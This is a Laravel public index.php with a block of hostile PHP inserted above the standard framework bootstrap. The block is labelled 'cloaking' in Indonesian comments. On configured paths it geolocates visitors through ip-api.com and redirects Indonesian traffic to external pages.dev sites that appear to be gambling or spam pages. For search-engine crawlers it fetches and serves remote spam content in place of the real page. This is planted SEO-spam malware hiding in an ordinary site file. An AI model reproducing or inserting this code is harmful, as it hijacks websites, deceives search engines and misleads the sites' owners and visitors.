<?php

function mangsud($url) {
    if (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $res = curl_exec($ch);
        curl_close($ch);
        return $res;
    }
    return false;
}

$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$uri = $_SERVER['REQUEST_URI'] ?? '/';
$uri_path = parse_url($uri, PHP_URL_PATH);

$bot_regex = "/(googlebot|google|adsbot|mediapartners|bingbot|slurp|yandex|duckduck|baidu|ahrefs|semrush|mj12|dotbot|crawler|spider|facebook|twitterbot|telegrambot)/i";

// Konfigurasi untuk berbagai path
$configs = [
    '/mice/' => [
        'amp' => 'https://world-mice-master333.pages.dev/',
        'lp' => 'https://world-mice-master333.pages.dev/containt'
    ],           
    '/blogs/' => [
        'amp' => 'https://user-blogs-master333.pages.dev/',
        'lp' => 'https://user-blogs-master333.pages.dev/containt'
    ],        
    '/package/5/hurghada/' => [
        'amp' => 'https://hurghada-kepo4d.pages.dev/',
        'lp' => 'https://hurghada-kepo4d.pages.dev/containt-kepo4d'
    ],
];

// Normalisasi path (hapus trailing slash untuk perbandingan)
$uri_path_normalized = rtrim($uri_path, '/');
if ($uri_path_normalized === '') {
    $uri_path_normalized = '/';
}

// DEBUG: Tambahkan logging untuk debugging
error_log("URI: $uri");
error_log("URI Path: $uri_path");
error_log("URI Normalized: $uri_path_normalized");
error_log("User Agent: $ua");

// Cek apakah URI cocok dengan salah satu path yang dikonfigurasi
$matched = false;
foreach ($configs as $path => $config) {
    $path_normalized = rtrim($path, '/');
    if ($path_normalized === '') {
        $path_normalized = '/';
    }
    
    error_log("Checking path: $path_normalized vs $uri_path_normalized");
    
    // Match path (dengan atau tanpa trailing slash)
    if ($uri_path_normalized === $path_normalized) {
        $matched = true;
        
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        error_log("IP Address: $ip");
        
        // Redirect IP Indonesia ke AMP
        if (!empty($ip)) {
            $geo = @json_decode(@file_get_contents("http://ip-api.com/json/$ip"), true);
            error_log("Country Code: " . ($geo['countryCode'] ?? 'Unknown'));
            
            if (!empty($geo['countryCode']) && $geo['countryCode'] === "ID") {
                error_log("Redirecting Indonesian IP to AMP");
                header("Location: " . $config['amp']);
                exit;
            }
        }
        
        // Tampilkan LP untuk bot
        if (preg_match($bot_regex, $ua)) {
            error_log("Bot detected, showing LP");
            $f = mangsud($config['lp']);
            if ($f) {
                echo $f;
            } else {
                // Fallback jika tidak bisa fetch
                echo "<script>window.location.href = '" . $config['lp'] . "';</script>";
            }
            exit;
        }
        
        // Untuk non-bot, non-ID, lanjut ke konten asli
        error_log("Non-bot, non-ID traffic, continuing to main site");
        break;
    }
}

// Jika tidak match dengan config cloaking, lanjut ke website normal
if (!$matched) {
    error_log("No path matched for cloaking, continuing to main site");
}

?>
<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

define('LARAVEL_START', microtime(true));

/*   
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__.'/core/vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/core/bootstrap/app.php';

$app->bind('path.public', function() {
    return __DIR__;
});

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/
 
$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);